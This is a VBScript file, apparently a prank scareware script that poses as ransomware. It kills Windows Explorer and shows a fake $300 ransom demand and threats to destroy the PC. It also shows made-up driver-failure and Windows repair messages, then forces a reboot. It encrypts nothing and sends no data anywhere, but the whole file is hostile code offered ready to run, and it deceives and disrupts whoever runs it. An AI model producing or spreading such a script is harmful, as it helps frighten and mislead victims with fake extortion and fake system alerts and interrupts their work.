' End Windows Explorer
Dim objWshShell
Set objWshShell = CreateObject("WScript.Shell")
objWshShell.Run "taskkill /im explorer.exe /f", 0, True

' Driver fail
Dim userInput
userInput = InputBox(" ", "Hello", "")

MsgBox "Your PC has is in my control.", vbOKOnly, "Windows Script Host"
If InputBox("Do you want to pay $300 to save your PC? (Y/N)", "Script Host", "") = "Y" Then MsgBox "Too bad lol."
MsgBox "I will destroy your PC in less than a minute.", vbOKOnly, "Windows Script Host"
MsgBox "For now here is cmd and IE if you want to attempt to save your PC.", vbOKOnly, "Windows Script Host"
objWshShell.Run "iexplore.exe"
objWshShell.Run "cmd.exe"
WScript.Sleep 3000
Set WshShell = CreateObject("Wscript.Shell")
WshShell.Popup "Windows has detected a problem and is working to find the source.", 3, "My Notification", 0
WScript.Sleep 2000
MsgBox "Your VBScript was or contained ransomware.", vbOKOnly, "Ransomeware alert."
MsgBox "A virus has corrupted 1 or more drivers on this PC.", vbOKOnly, "Error: Driver Failure"
MsgBox "Windows is trying to repair drivers.", vbOKOnly, "Windows Repair"
MsgBox "Your PC will reboot shortly.", vbOKOnly, "Windows Repair"

' The Final Crash
CreateObject("WScript.Shell").Run "shutdown /r", 0, False

